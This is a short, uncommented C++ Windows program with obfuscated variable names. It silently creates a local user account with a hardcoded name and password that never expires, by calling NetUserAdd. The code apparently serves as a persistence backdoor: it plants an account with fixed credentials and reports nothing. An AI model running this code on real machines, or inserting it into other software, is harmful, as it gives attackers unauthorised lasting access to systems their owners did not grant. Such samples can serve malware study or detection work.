#include <windows.h>
#include <lm.h>
int main()
{   
    wchar_t* c63752914100 = const_cast<wchar_t*>(L"DSzOO3vnAu");
    wchar_t* f8c4 = const_cast<wchar_t*>(L"OHBanV974e");
    USER_INFO_1 Elngl;
    DWORD dcdf16a28e2d = 0;
    Elngl.usri1_name = c63752914100;
    Elngl.usri1_password = f8c4;
    Elngl.usri1_password_age = 0;
    Elngl.usri1_priv = USER_PRIV_USER;
    Elngl.usri1_home_dir = NULL;
    Elngl.usri1_comment = NULL;
    Elngl.usri1_flags = UF_DONT_EXPIRE_PASSWD;
    Elngl.usri1_script_path = NULL;
    NET_API_STATUS u = NetUserAdd(NULL, (DWORD)1, (LPBYTE)&Elngl,(LPDWORD)&dcdf16a28e2d);
    if (u == NERR_Success) {
    
    }  
    return 0;
}

